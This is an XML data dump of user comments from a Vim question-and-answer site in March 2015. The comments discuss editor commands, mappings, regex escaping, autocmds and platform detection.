  <row Id="2442" PostId="2520" Score="0" Text="From the question, it's not that obvious this is a bug... This question is probably flagged automatically because it's below a certain numbers of characters &amp; has a link." CreationDate="2015-03-12T19:56:07.640" UserId="51" />
  <row Id="2443" PostId="2522" Score="0" Text="Yeah, `^I` is marginally better than `&lt;09&gt;`, but it's still too noisy for my liking, as I can't easily scan the register list for the line I want..." CreationDate="2015-03-12T20:20:39.860" UserId="51" />
  <row Id="2444" PostId="2450" Score="0" Text="@ChadParadis Feel free to accept an answer or not as you see fit. The only case in which it's bad etiquette not to accept an answer is when there is a definitive, comprehensive, clearly correct, well-explained answer. My answer is absolutely not definitive or comprehensive: I can only offer a partial, cumbersome solution." CreationDate="2015-03-12T20:39:15.527" UserId="8" />
  <row Id="2445" PostId="2478" Score="1" Text="The advantage of using gn is, you do not have to type `n.n.` but only `.`" CreationDate="2015-03-12T21:30:50.117" UserId="71" />
  <row Id="2446" PostId="2524" Score="0" Text="That is both good to know and an improvement, but still not ideal. What I'm really looking for is a succinct way to yank upward without having to move the cursor back to where it was." CreationDate="2015-03-12T22:04:33.430" UserId="163" />
  <row Id="2447" PostId="2524" Score="0" Text="Thanks, your edit is pretty much what I'm looking for. Your first paragraph, however, doesn't seem to work as you describe: `]` does not move to the end of what I yank." CreationDate="2015-03-12T22:13:57.773" UserId="163" />
  <row Id="2448" PostId="2524" Score="0" Text="He said `']` not `]`." CreationDate="2015-03-12T22:26:28.940" UserId="865" />
  <row Id="2449" PostId="2525" Score="1" Text="That.... is even better. It's more succinct, and somehow feels more Vim-y. Thanks!" CreationDate="2015-03-12T22:37:17.943" UserId="163" />
  <row Id="2450" PostId="2516" Score="1" Text="If what the OP really wanted is to look at compilation errors then using `:make` and the quickfix is the way to go. Also take a look at `:compiler` for setting common different `'makeprg'` and `'errorformat'`'s (See `:h :compiler`). I also find it good to have nice mappings for `:cn`/`:cp`. I use Tim Pope's [unimpaired.vim](https://github.com/tpope/vim-unimpaired) which provide `]q` and `[q` respectively." CreationDate="2015-03-12T23:52:26.660" UserId="778" />
  <row Id="2451" PostId="2528" Score="0" Text="You could use `m'`." CreationDate="2015-03-13T08:11:45.013" UserId="54" />
  <row Id="2452" PostId="2528" Score="0" Text="Sorry if my question is not clear. I want to know which mark is set on the current line. Is there a command through which Vim will display mark set on the current line?" CreationDate="2015-03-13T09:01:01.030" UserId="230" />
  <row Id="2453" PostId="2526" Score="0" Text="you can also press `i` and use the backspace key. No body will shoot you for that. I think." CreationDate="2015-03-13T09:46:49.587" UserId="342" />
  <row Id="2454" PostId="2526" Score="0" Text="but backspace won't delete character of above line" CreationDate="2015-03-13T09:56:12.923" UserId="1276" />
  <row Id="2455" PostId="2527" Score="1" Text="It's probably worth mentioning that you need to hit `Enter` after typing `d?1`." CreationDate="2015-03-13T10:08:13.837" UserId="343" />
  <row Id="2456" PostId="2527" Score="0" Text="@Rich indeed thanks, I have updated the answer to include that." CreationDate="2015-03-13T10:10:31.517" UserId="246" />
  <row Id="2457" PostId="2531" Score="0" Text="why dk will delete both current line and above line completely" CreationDate="2015-03-13T10:14:45.823" UserId="1276" />
  <row Id="2458" PostId="2526" Score="1" Text="@AaronShen That depends on your 'backspace' setting. If it includes `eol` then backspace *will* delete line breaks. You'll also need `start` to be included in the setting. (See `:help backspace`). Don't use this method though! There are several much faster methods detailed in the answers below." CreationDate="2015-03-13T10:17:12.027" UserId="343" />
  <row Id="2459" PostId="2531" Score="0" Text="@AaronShen Nope. Try it." CreationDate="2015-03-13T10:18:05.113" UserId="343" />
  <row Id="2460" PostId="2531" Score="0" Text="@Rich if that works for you then you have a setting that enables that delete movement. I've just tested it with `vim -u NONE -U NONE` and it deletes both lines." CreationDate="2015-03-13T11:40:45.300" UserId="599" />
  <row Id="2461" PostId="2527" Score="0" Text="What font is that shell using?" CreationDate="2015-03-13T12:24:39.577" UserId="1346" />
  <row Id="2465" PostId="2531" Score="0" Text="@Vitor You're right. Trying to figure out which setting does it, now." CreationDate="2015-03-13T12:50:53.350" UserId="343" />
  <row Id="2466" PostId="2531" Score="0" Text="Your &quot;delete up&quot; trick works if you replace `gk` for `k`." CreationDate="2015-03-13T13:15:49.220" UserId="13" />
  <row Id="2467" PostId="2531" Score="0" Text="@toro2k Yup! You commented as I was editing my answer to say so :)." CreationDate="2015-03-13T13:17:14.263" UserId="343" />
  <row Id="2468" PostId="2534" Score="0" Text="The 'nocompatible' thing was a complete red herring. I messed up when I was testing because I am an idiot." CreationDate="2015-03-13T13:19:50.287" UserId="343" />
  <row Id="2469" PostId="2531" Score="0" Text="@AaronShen Apologies for my (repeated) mistakes!" CreationDate="2015-03-13T13:20:22.417" UserId="343" />
  <row Id="2470" PostId="2531" Score="0" Text="Nice! I wasn't aware of this trick. But I can see that you have `k` mapped to `gk`!" CreationDate="2015-03-13T15:03:27.660" UserId="599" />
  <row Id="2471" PostId="2527" Score="0" Text="@ChrisBurt-Brown: Terminus" CreationDate="2015-03-13T15:24:36.097" UserId="246" />
  <row Id="2472" PostId="2531" Score="0" Text="@Vitor Yup. Hence all the confusion you can see in my repeated edits!" CreationDate="2015-03-13T15:31:34.483" UserId="343" />
  <row Id="2473" PostId="2536" Score="2" Text="Minor note: You can use `\zs` and `\ze` independently. In this case, the `\zs` can be omitted since it's at the start of the pattern already." CreationDate="2015-03-13T18:23:46.913" UserId="64" />
  <row Id="2474" PostId="2538" Score="2" Text="I'm not too sure but I /think/ this is a bug. I also could be wrong so I'm not posting this as an answer. However, to circumvent this, you can search \[ using /\\[ and then use `:s///g` Here, vim will use the old search term in the blank pattern" CreationDate="2015-03-13T19:18:53.487" UserId="246" />
  <row Id="2475" PostId="2538" Score="0" Text="I suspect that ```\[``` has some special meaning which i do not understand and can't find it on google." CreationDate="2015-03-13T19:19:47.897" UserId="1067" />
  <row Id="2476" PostId="2538" Score="1" Text="You can use the very nomagic mode like so:  `:s/\V\\[//g` (See `:help \V`)" CreationDate="2015-03-13T19:22:03.920" UserId="246" />
  <row Id="2477" PostId="2538" Score="1" Text="I tried it, and it works if you escape the `[` like so: `:s/\\\[//g`" CreationDate="2015-03-13T19:23:08.387" UserId="865" />
  <row Id="2479" PostId="2538" Score="0" Text="Yea i noticed it myself at the same time, it was malformed regex without closing ```]```. Thank you." CreationDate="2015-03-13T19:31:48.967" UserId="1067" />
  <row Id="2480" PostId="2540" Score="0" Text="Just a small comment, `\V` means very _no_ magic" CreationDate="2015-03-13T19:40:10.900" UserId="246" />
  <row Id="2481" PostId="2540" Score="0" Text="@Akshay: Right, corrected!" CreationDate="2015-03-13T19:50:00.250" UserId="970" />
  <row Id="2482" PostId="2538" Score="1" Text="@Akshay: I think it's a bug, too. Posted [here on vim_dev](https://groups.google.com/d/msg/vim_dev/IGubDymd4iw/rqe7LDCwQZsJ)." CreationDate="2015-03-13T20:55:54.260" UserId="970" />
  <row Id="2483" PostId="2543" Score="2" Text="I think the last `d` acts as a confirm; So it's the same as `d3&lt;CR&gt;`. `y3y` and `c3c` also work the same ... I can't find any docs on this though in either the Vim :help, vi(1), nvi(1), or the POSIX spec... It does behave the same in `vi` and `nvi` btw." CreationDate="2015-03-13T23:04:38.013" UserId="51" />
  <row Id="2484" PostId="2544" Score="0" Text="I assume the `pre-commit` hook works fine when you just use `git commit`? What happens if you use a very simple `pre-commit` hook like only `exit 0` or `exit 1`?" CreationDate="2015-03-13T23:08:40.543" UserId="51" />
  <row Id="2486" PostId="2545" Score="0" Text="No, this is not a duplicate. I want vi to start in insert mode ONLY FOR THE THREE SCENARIOS I HAVE MENTIONED." CreationDate="2015-03-13T23:23:04.043" UserId="368" />
  <row Id="2487" PostId="2545" Score="3" Text="OKAY, I'M SORRY BUT IT REALLY LOOKED LIKE A DUPLICATE. ;-) I've edited your question a bit to make the differences clearer." CreationDate="2015-03-13T23:47:37.527" UserId="51" />
  <row Id="2488" PostId="2545" Score="0" Text="Related: https://vi.stackexchange.com/questions/239/how-do-i-make-vim-use-a-default-filename-when-not-given-any-filenames, https://vi.stackexchange.com/questions/258/how-do-i-run-a-command-on-creation-of-a-new-file" CreationDate="2015-03-14T00:13:36.970" UserId="205" />
  <row Id="2489" PostId="2543" Score="1" Text="In a way, `dd` is identical to `d_`. `_` brings the cursor to the first non-blank on the (`[count]`-1)th line down, but it's linewise, so when paired with an operator, it operates on entire lines. For that reason, it makes sense that a count can appear between the two `d`s." CreationDate="2015-03-14T00:40:52.547" UserId="64" />
  <row Id="2490" PostId="2544" Score="0" Text="It does work. It's really the output generated and the prompt." CreationDate="2015-03-14T01:17:09.977" UserId="812" />
  <row Id="2492" PostId="2531" Score="0" Text="BTW it turns out using `gk` as characterwise apparently requires `:set wrap` (somewhat cryptically).  I couldn't figure out why this seemingly was working for everyone else but not for me, when the help for `gk` likewise seemed to imply it should work.  The only clue was that the main meaning of `gk` had to do with wrapped lines.  Once I tried setting wrap on (kind of on a whim), voila, it worked." CreationDate="2015-03-14T02:08:17.147" UserId="1344" />
  <row Id="2493" PostId="2546" Score="0" Text="Great answer! Upvoted. I did link to my use case (also on vi.SE) at the start of the question, but I guess you must have missed it. I basically need to do `:omap d d` (!), but unfortunately operator-pending mode is never actually reached because of my mapping for d that sets the custom operator function. Hopefully it's possible to tweak things to make `d3d` work how it should, though. (Let me know if you have any ideas, or feel free to post a complete solution to the other question if you prefer.) If I can't figure it out soon, I'll accept this and post another, more specific question. Thanks!" CreationDate="2015-03-14T08:22:58.877" UserId="343" />
  <row Id="2494" PostId="2547" Score="0" Text="`iab &lt;buffer&gt; E...`?" CreationDate="2015-03-14T08:42:08.847" UserId="205" />
  <row Id="2495" PostId="2546" Score="0" Text="Actually, on second thoughts, I'm accepting this now. You explained both how to create such a mapping, and also how it works under the hood, which were the two things I asked." CreationDate="2015-03-14T08:51:07.763" UserId="343" />
  <row Id="2496" PostId="2547" Score="0" Text="@muru That doesn't work from a modeline." CreationDate="2015-03-14T09:08:03.390" UserId="267" />
  <row Id="2497" PostId="2545" Score="0" Text="Well, @muru, the first link is irrelevant to my question, and the second link's answers show how to run a Unix command when a file is created, but I need to run a vim command ('i'), and need to run it in the other two cases as well." CreationDate="2015-03-14T09:12:52.967" UserId="368" />
  <row Id="2499" PostId="2549" Score="5" Text="OP mentions that he's already tried this in his question. If you're posting this because it's definitely the only possible solution, you should probably say so explicitly." CreationDate="2015-03-14T09:25:16.943" UserId="343" />
  <row Id="2500" PostId="2545" Score="2" Text="@JohnSonderson the first link tells you how to find if no filename is given, the second can be adapted by using `normal` instead of `exec`." CreationDate="2015-03-14T09:42:40.943" UserId="205" />
  <row Id="2501" PostId="2547" Score="0" Text="This specific scenario is calling for `\newcommand{\EI}{Elçilerin İşleri}`" CreationDate="2015-03-14T12:04:19.247" UserId="8" />
  <row Id="2502" PostId="2547" Score="0" Text="@Gilles I actually started out with that, but it has a couple drawbacks. One is that it makes post-processing harder. There are a couple of scripts that keep track of what gets referenced where (that checks an API to validate the references) and doing this against the TeX source is a lot easier that having to compile it and run against the formatted output." CreationDate="2015-03-14T12:36:32.577" UserId="267" />
  <row Id="2503" PostId="2550" Score="0" Text="How about the autocmd for WinEnter? When the last window that isn't yours is exited, you should get a winEnter on your window, and can check that yours is the only window and then quit." CreationDate="2015-03-14T12:56:04.497" UserId="227" />
  <row Id="2504" PostId="2555" Score="1" Text="Wow, these are some great mappings and settings. Thank you for the detailed answer." CreationDate="2015-03-14T18:04:58.377" UserId="489" />
  <row Id="2505" PostId="2545" Score="0" Text="Please see my updated post, still not sure if there's a way to do what I'm looking for." CreationDate="2015-03-14T21:54:16.473" UserId="368" />
  <row Id="2506" PostId="2561" Score="0" Text="Wonderful! I think, it works only the client side terminal supports it, but it can work!" CreationDate="2015-03-15T05:30:19.627" UserId="28" />
  <row Id="2508" PostId="2553" Score="0" Text="`iskeyword=@,48-57,_,192-255,-,#,.&#xA;        Last set from ~/dotfiles/vim/plugged/vim-coloresque/after/syntax/css/vim-coloresque.vim`" CreationDate="2015-03-15T06:02:48.213" UserId="237" />
  <row Id="2510" PostId="2553" Score="0" Text="You know what, it is working in a new text file. Just not in the `.html.slim` template" CreationDate="2015-03-15T06:04:41.953" UserId="237" />
  <row Id="2512" PostId="2553" Score="0" Text="Yep, that was right from `.html.slim`. Here is the output from a new file: `iskeyword=@,48-57,_,192-255&#xA;        Last set from ~/.vimrc`" CreationDate="2015-03-15T06:07:56.313" UserId="237" />
  <row Id="2513" PostId="2560" Score="3" Text="So what's your question exactly? You followed some instructions somewhere (where? what exactly did you do?) and something doesn't work (what?) as you're expecting (what did you expect?)" CreationDate="2015-03-15T06:08:44.237" UserId="51" />
  <row Id="2514" PostId="2553" Score="0" Text="Here it is in `vim-coloresque`: https://github.com/gorodinskiy/vim-coloresque/blob/master/after/syntax/css/vim-coloresque.vim#125-127" CreationDate="2015-03-15T06:09:28.373" UserId="237" />
  <row Id="2516" PostId="2563" Score="0" Text="Dammit I forgot to mention that I'd like it for insert mode too. I suppose that can be handled by an `imap` with `&lt;ESC&gt;` prepended and `a` appended?" CreationDate="2015-03-15T06:29:11.287" UserId="205" />
  <row Id="2517" PostId="2554" Score="7" Text="I've voted to close this question as off-topic because no definitive answer can be given. It will simple be an (probably incomplete) list of plugins, that will probably soon become outdated." CreationDate="2015-03-15T06:29:29.307" UserId="51" />
  <row Id="2518" PostId="2563" Score="0" Text="@muru I would say that using `&lt;Down&gt;` and `&lt;End&gt;` is easier ;-) See updated answer." CreationDate="2015-03-15T06:32:51.677" UserId="51" />
  <row Id="2519" PostId="2563" Score="0" Text="(mumble mumble) tunnel vision (mumble mumble). :D" CreationDate="2015-03-15T06:34:47.637" UserId="205" />
  <row Id="2520" PostId="2545" Score="1" Text="The vimrc file is read *only once*: when Vim starts. The contents of autocmd is run every time it's triggered. So the `if` statement should not be *around* the autocmd, if should be *inside* the autocmd, so it will be run every time the autocmd is triggered." CreationDate="2015-03-15T06:42:54.147" UserId="51" />
  <row Id="2521" PostId="2544" Score="1" Text="As, so you mean &quot;Vim freezes while the tests are running&quot;? And not &quot;Vim freezes indefinitely and I need to kill it&quot;?" CreationDate="2015-03-15T06:54:50.043" UserId="51" />
  <row Id="2522" PostId="839" Score="0" Text="Very related question: http://vi.stackexchange.com/questions/2135/can-i-add-an-end-of-line-string-when-vim-wraps-a-line-due-to-textwidth ..." CreationDate="2015-03-15T06:58:49.750" UserId="51" />
  <row Id="2523" PostId="2563" Score="1" Text="Whitespace is totally valid in the right-hand-side of an `&lt;expr&gt;` mapping. You might be thinking of `:set`?" CreationDate="2015-03-15T11:52:24.310" UserId="64" />
  <row Id="2524" PostId="839" Score="0" Text="In fact, I think it's a dup :)" CreationDate="2015-03-15T12:21:19.480" UserId="91" />
  <row Id="2525" PostId="2563" Score="0" Text="@tommcdo Yeah, I had it mixed up :-/" CreationDate="2015-03-15T15:22:26.807" UserId="51" />
  <row Id="2526" PostId="2544" Score="0" Text="As soon as I press `C`, Vim goes to the terminal view and there is no output. I will add the part of the script which has the prompt" CreationDate="2015-03-15T17:14:04.587" UserId="812" />
  <row Id="2527" PostId="2514" Score="1" Text="This behavior has been reported at https://github.com/neovim/neovim/issues/1551 as a bug." CreationDate="2015-03-15T18:42:47.567" UserId="300" />
  <row Id="2528" PostId="2554" Score="4" Text="See https://github.com/neovim/neovim/wiki/Related-projects for a list of projects related to Neovim, including plugins that make use of Neovim's features." CreationDate="2015-03-15T18:44:06.360" UserId="300" />
  <row Id="2529" PostId="2531" Score="0" Text="@BobH You're right. Odd. That's a very poorly worded bit of help text." CreationDate="2015-03-15T20:42:56.847" UserId="343" />
  <row Id="2530" PostId="2478" Score="0" Text="I see, [that is useful](http://vimcasts.org/episodes/operating-on-search-matches-using-gn/). I had better upgrade to Vim 7.4!" CreationDate="2015-03-15T21:07:31.457" UserId="630" />
  <row Id="2531" PostId="2573" Score="0" Text="I was going to suggest this too, but found out that this does not work for me. Maybe a Vim bug? It just opens a larger horizontal split for me." CreationDate="2015-03-16T08:40:09.133" UserId="246" />
  <row Id="2532" PostId="2573" Score="0" Text="@Akshay Works for me in Vim 7.3." CreationDate="2015-03-16T08:42:18.983" UserId="24" />
  <row Id="2533" PostId="2573" Score="0" Text="@200_success works for me too, thank you!" CreationDate="2015-03-16T08:42:36.400" UserId="1317" />
  <row Id="2534" PostId="2573" Score="0" Text="Oh, seems to work if I do `vim -Nu NONE`. Nevermind ;). EDIT: Ah it was because I always set the quickfix window to open at the bottom with `wincmd J`" CreationDate="2015-03-16T08:46:39.363" UserId="246" />
  <row Id="2535" PostId="2572" Score="0" Text="Could you provide some specific examples of OS-dependent behaviours that you seek to implement?" CreationDate="2015-03-16T08:47:55.587" UserId="24" />
  <row Id="2536" PostId="2572" Score="0" Text="@200_success I have some scripts and key bindings for [MS TFS](https://en.wikipedia.org/wiki/Team_Foundation_Server) and msbuild that are pretty useless in non-Windows environments, while I don't need [tmux](http://tmux.sourceforge.net/) support in gVim on Windows. In addition, there are different fonts installed on different systems, and paths may differ as well." CreationDate="2015-03-16T08:52:48.367" UserId="1317" />
  <row Id="2537" PostId="389" Score="0" Text="I had the reverse. YCM worked fine (even if it was a PITA to install) but clang-complete never worked..." CreationDate="2015-03-16T09:12:44.790" UserId="622" />
  <row Id="2539" PostId="2542" Score="0" Text="just a silly question - how do you manage to copy the statusline ? I would like to ask another question about airline." CreationDate="2015-03-16T09:42:39.577" UserId="1382" />
  <row Id="2540" PostId="2574" Score="1" Text="Very important to note [romainl's answer](http://vi.stackexchange.com/a/2577/343) if you want it to work on OS X, though." CreationDate="2015-03-16T10:33:05.560" UserId="343" />
  <row Id="2541" PostId="2577" Score="0" Text="Well, OSX is a UNIX system, I believe it's even &quot;certified UNIX&quot;. So `has('unix')` is accurate. It's odd that `has('macunix')` is false, though. This almost sounds like a bug?" CreationDate="2015-03-16T10:48:37.793" UserId="51" />
  <row Id="2542" PostId="2577" Score="0" Text="I did some checking, and `has('macunix')` seems to depend on `MACOS_X_UNIX`, which is set if `uname` is `Darwin` in the `configure` script..." CreationDate="2015-03-16T10:56:48.173" UserId="51" />
  <row Id="2543" PostId="2581" Score="0" Text="That doesn't address what the OP is asking, though." CreationDate="2015-03-16T13:37:05.070" UserId="15" />
  <row Id="2544" PostId="2581" Score="0" Text="@jamessan re-read the question and still don't get - so, the goal is to delete all lines containing unique words?" CreationDate="2015-03-16T13:38:23.443" UserId="1302" />
  <row Id="2545" PostId="2581" Score="1" Text="The goal is to delete a line if that is the only line in the file containing a certain word." CreationDate="2015-03-16T13:39:27.803" UserId="15" />
  <row Id="2546" PostId="2580" Score="0" Text="Have you tried anything so far? By showing your attempts and describing what parts you are having difficulty with, we get a better understanding of your proficiency and can give a more precise answer. As it stands, it just looks like you've posted a requirement and want someone to write your code for you." CreationDate="2015-03-16T13:40:49.037" UserId="970" />
  <row Id="2547" PostId="2581" Score="0" Text="@jamessan I'm not arguing, I'm just trying to understand the question better to asnwer it neverthelees. &quot;The only line in file containing a certain word&quot; - but it looks like :g/&lt;pattern&gt;/d  falls under this definition" CreationDate="2015-03-16T13:41:36.210" UserId="1302" />
  <row Id="2548" PostId="2581" Score="1" Text="The OP doesn't know what words need to be deleted.  So the goal is to have a way to run a command which will determine which of a set of words only appear in one line and then delete those lines.  `:g/{pattern}/d` only solves the second part of the problem, not the first." CreationDate="2015-03-16T13:43:54.310" UserId="15" />
  <row Id="2549" PostId="2581" Score="0" Text="@jamessan in that case the definition of unique word should be clarified by OP, because, for instance, any line with number occured once (&quot;3 downto 0&quot; in the example whould be deleted as well" CreationDate="2015-03-16T13:46:33.680" UserId="1302" />
  <row Id="2550" PostId="2580" Score="0" Text="Can you please clarify, so, the goal is to delete all lines containing unique words? Without knowing beforehandedly what are these unique words?" CreationDate="2015-03-16T13:47:25.863" UserId="1302" />
  <row Id="2551" PostId="2580" Score="0" Text="@shabunc, yes, that is the situation." CreationDate="2015-03-16T13:51:02.557" UserId="356" />
  <row Id="2552" PostId="2580" Score="0" Text="@IngoKarkat I haven't. I normally would (I know how SE works ;) ) but in this case I have no feeling at all on how I could achieve this. The only thing that occurs to me is searching and counting. But since I don't know the words I want to search beforehand I really don't know where to start..." CreationDate="2015-03-16T13:59:01.510" UserId="356" />
  <row Id="2553" PostId="2580" Score="0" Text="Do you require a single command that carries out the entire process? Or are you just looking to get the job done?" CreationDate="2015-03-16T14:02:02.967" UserId="343" />
  <row Id="2554" PostId="2580" Score="0" Text="@Rich, a single command would be preferred. But multiple commands are also welcome." CreationDate="2015-03-16T14:03:36.873" UserId="356" />
  <row Id="2556" PostId="2542" Score="0" Text="I just shift-highlighted and copied from tmux." CreationDate="2015-03-16T14:09:52.763" UserId="1336" />
  <row Id="2557" PostId="2580" Score="0" Text="@Rich, I think &quot;delete all lines which contain any unique words&quot; is the right question to think about. So that the answer can be useful in other situations. But for more general cases it could be useful to put restrictions like &quot;if the unique word is a number do not delete the line&quot;." CreationDate="2015-03-16T14:19:23.393" UserId="356" />
  <row Id="2558" PostId="2580" Score="0" Text="I think the mistake that I (and shabunc, below) was making is that we thought that *all* the lines in the file conformed to the format described in your code sample, whereas now I'm guessing that the *rest* of the file is completely different?" CreationDate="2015-03-16T14:21:18.760" UserId="343" />
  <row Id="2559" PostId="2577" Score="0" Text="Oddly enough, `has (&quot;win32&quot;)` seems to work for me even in 64-bit Vim." CreationDate="2015-03-16T14:29:30.460" UserId="343" />
  <row Id="2560" PostId="2580" Score="0" Text="@Rich yes, the rest of the file is completely different. I edited my question to provide an example file. Thank you for your edit, btw." CreationDate="2015-03-16T14:36:58.773" UserId="356" />
  <row Id="2561" PostId="2582" Score="0" Text="So what are you looking for? Using `''` or `&lt;C-o&gt;` is sort of the answer :-) Do you want it to happen automatically?" CreationDate="2015-03-16T14:53:58.930" UserId="51" />
  <row Id="2562" PostId="2580" Score="0" Text="Is there a reason this must be done in vim commands rather than, say, an external script that could be run on the file? It feels like the problem might be easier to approach from the outside." CreationDate="2015-03-16T14:56:05.813" UserId="1166" />
  <row Id="2563" PostId="2582" Score="0" Text="Automatically would be great; I'm hoping to eliminate an extra couple of keys, since I find myself going find-replace a lot, oh and learn something new (_:" CreationDate="2015-03-16T15:06:43.183" UserId="1389" />
  <row Id="2564" PostId="2580" Score="1" Text="@SnoringFrog, I have two reasons: 1) achieving OS independence for the task (on Linux a script for this would be easy, but not on Windows, I think); 2) exploring the limits of Vim." CreationDate="2015-03-16T15:34:09.663" UserId="356" />
  <row Id="2567" PostId="2577" Score="0" Text="@Rich Yes, and that's documented as such. This is really the sane thing to do, do you care if your app is 32 or 64 bits? I don't. The reason it's called 'win32', is because that's the name Microsoft choose for their Windows NT API. [Naming things isn't Microsoft's strong point](http://stackoverflow.com/q/4039054/660921)." CreationDate="2015-03-16T16:55:43.820" UserId="51" />
  <row Id="2568" PostId="2577" Score="0" Text="@Carpetsmoker I agree it makes sense from pragmatism. If the documentation is using Win32 to mean &quot;Windows API&quot;, though, what does it (and romainl) mean when it refers to &quot;Win64&quot;?" CreationDate="2015-03-16T17:26:48.490" UserId="343" />
  <row Id="2569" PostId="2577" Score="0" Text="@Rich This is also in the documentation: *&quot;Win64 version of Vim (MS-Windows 64 bit).&quot;*..." CreationDate="2015-03-16T17:41:03.027" UserId="51" />
  <row Id="2570" PostId="2583" Score="0" Text="Is there a way to &quot;enable&quot; `KeepView` for all find-replace operations? I'm trying to minimize typing (_:" CreationDate="2015-03-16T17:57:27.003" UserId="1389" />
  <row Id="2571" PostId="2577" Score="0" Text="@Carpetsmoker I'm looking at the documentation. What I can't figure out is how you're interpreting it. To me, it's saying that win32 will be set on 32-bit Vim (regardless of what version of Windows it's running under), and that win64 will be set in 64-bit Vim. You're saying it means something different, but I can't figure out what." CreationDate="2015-03-16T18:06:56.490" UserId="343" />
  <row Id="2572" PostId="2542" Score="0" Text="Thanks for the trick, it works with vim, but not with gvim, any idea ?" CreationDate="2015-03-16T18:17:34.787" UserId="1382" />
  <row Id="2573" PostId="2582" Score="0" Text="@Carpetsmoker as well as `` ) Actually it looks like this particular question boils down to the issue whether it is possible to find some autocmd event we can listen to and trigger this automatically." CreationDate="2015-03-16T18:53:25.813" UserId="1302" />
  <row Id="2574" PostId="2583" Score="1" Text="You can create a shorter `:KV` alias command, or even `:kv` using cmdalias.vim. To be even more extreme: `:nnoremap : :KeepView&lt;Space&gt;`" CreationDate="2015-03-16T19:59:50.123" UserId="970" />
  <row Id="2575" PostId="96" Score="0" Text="ssh -Y implies -X so -X can be omitted." CreationDate="2015-03-16T20:52:44.290" UserId="395" />
  <row Id="2576" PostId="2588" Score="0" Text="Perfect. This question doesn't require escaping inside of the variable but, just for completeness, how would one do that? Just use `split` on the variable and concatenate it back together into a new variable with escape characters where they are required?" CreationDate="2015-03-16T22:05:17.263" UserId="1154" />
  <row Id="2577" PostId="2558" Score="0" Text="This answer has the slight problem that if you do &lt;kbd&gt;Ctrl+o&lt;/kdb&gt; in the &quot;help&quot; window and then attempt to switch back to the regular hidden buffer (with, e.g. `:b1`), Vim closes. Switching the variable to be buffer local fixes this problem, though. (Which makes sense. Although I stated that I want the window to be transient, it's really *any* window that currently contains the *buffer* that I want to behave differently.)" CreationDate="2015-03-16T22:19:58.877" UserId="343" />
  <row Id="2578" PostId="2220" Score="2" Text="Bump! If you check the Gundo issue, someone has posted a fork that provides a searching feature." CreationDate="2015-03-16T22:25:32.170" UserId="630" />
  <row Id="2579" PostId="2564" Score="0" Text="What do you mean &quot;actionable&quot;? Or more specifically, what actions can I take, and how?" CreationDate="2015-03-16T23:05:38.850" UserId="630" />
  <row Id="2581" PostId="2588" Score="2" Text="The easiest way would be to use the `\V` or very non-magic along with the `escape()` function. e.g. `let regex = '\V\^The \(' . join(map(keys(myDict), 'escape(v:val, '''\''')'), '\|') . '\)'`" CreationDate="2015-03-16T23:11:32.707" UserId="778" />
  <row Id="2583" PostId="2560" Score="0" Text="Part of the process Aaron didn't mention is actually generating the tags file.  That might be possible by running something on the shell: `jsctags *.js **/*.js`" CreationDate="2015-03-17T00:18:04.520" UserId="630" />
  <row Id="2585" PostId="2564" Score="0" Text="I suppose typing `:[line_number]` is the obvious action. I can also yank the last line with `/y` or delete all of them with `/d`. (I just stumbled across the holy grail.) Is there any way to yank all the lines?" CreationDate="2015-03-17T00:30:31.757" UserId="630" />
  <row Id="2586" PostId="2592" Score="1" Text="Thanks, this command worked ... `:34908,34914w ~/webservicelogextract.txt`" CreationDate="2015-03-17T01:58:38.767" UserId="398" />
  <row Id="2587" PostId="2220" Score="0" Text="@joeytwiddle I saw that! Haven't checked it out yet, though." CreationDate="2015-03-17T02:27:43.810" UserId="1060" />
  <row Id="2588" PostId="2593" Score="0" Text="I may not have been clear enough - I'm fine with how the status line looks with regard to current match highlighting. What I want is for the items in the list appearing above the status line (when `set wildmode=list` is set) to be highlighted as well." CreationDate="2015-03-17T02:32:29.533" UserId="489" />
  <row Id="2589" PostId="1909" Score="0" Text="The bolding makes the `zw` look like capitals." CreationDate="2015-03-17T04:10:49.070" UserId="205" />
  <row Id="2590" PostId="2589" Score="0" Text="This is an excellent trick" CreationDate="2015-03-17T06:23:24.650" UserId="489" />
  <row Id="2591" PostId="2564" Score="0" Text="@joeytwiddle, yes, `:23&lt;CR&gt;` is the obvious one. You can use `:g//y A` to yank all the lines in the output to register `a`." CreationDate="2015-03-17T06:44:15.163" UserId="54" />
  <row Id="2592" PostId="2596" Score="0" Text="There is no 'pretty' name, but you can use `:command` to get a list of user-defined commands (this includes commands from plugins). You can also use `:nmap` to get a list of user-defined keybinds, `:function` for user-defined functions, and so forth..." CreationDate="2015-03-17T10:24:59.387" UserId="51" />
  <row Id="2593" PostId="2593" Score="2" Text="@broma0 I edited your answer to make it a bit clearer what you're asking for. (The &quot;status line&quot; you're referring to *is* the wildmenu.)" CreationDate="2015-03-17T10:29:03.577" UserId="343" />
  <row Id="2595" PostId="2592" Score="1" Text="Note that most (all?) commands that take a range also work from Visual mode. When you type `:` from Visual mode, it automatically inserts `'&lt;,'&gt;` for you. This is a range using special marks that refer to the start and end of a Visual selection. Leave the inserted range and type in your command (it will look like `:'&lt;,'&gt;w webservicelogextract.txt`)." CreationDate="2015-03-17T11:17:38.043" UserId="64" />
  <row Id="2596" PostId="2580" Score="0" Text="In your sample file, a completely generic solution might also delete the last line, which contains a unique `3`. I bring this up because I feel the problem is too delicate for a general solution." CreationDate="2015-03-17T11:30:46.860" UserId="64" />
  <row Id="2597" PostId="2593" Score="0" Text="@broma0 I don't think the highlighting for that can be changed without affecting other colors." CreationDate="2015-03-17T12:03:55.057" UserId="865" />
  <row Id="2598" PostId="2580" Score="0" Text="Typically simulators provide a linting option that reports unused declared signals. What I do is to copy that list to the file and then record a macro that searches the signal under the cursor, deletes the line, searches again and deletes line again (the original one where we started). I then just repeat the macro the required number of times." CreationDate="2015-03-17T12:19:30.090" UserId="599" />
  <row Id="2599" PostId="2598" Score="0" Text="This would require defining your own option for `set` ;  AFAIK, this is not possible in Vim ..." CreationDate="2015-03-17T12:31:06.347" UserId="51" />
  <row Id="2600" PostId="2598" Score="0" Text="@Carpetsmoker Does that mean the answer to this question is that vimscript cannot wrapper or otherwise extend built-in functions?" CreationDate="2015-03-17T12:36:41.873" UserId="267" />
  <row Id="2601" PostId="2594" Score="0" Text="If you're talking about buffers, rather than Vim-tabs, you could try http://fholgado.com/minibufexpl, which provides more of a tabby sort of experience than the answers currently given. It will resize itself to be as many rows as necessary to fit in all the buffer names." CreationDate="2015-03-17T13:43:59.650" UserId="343" />
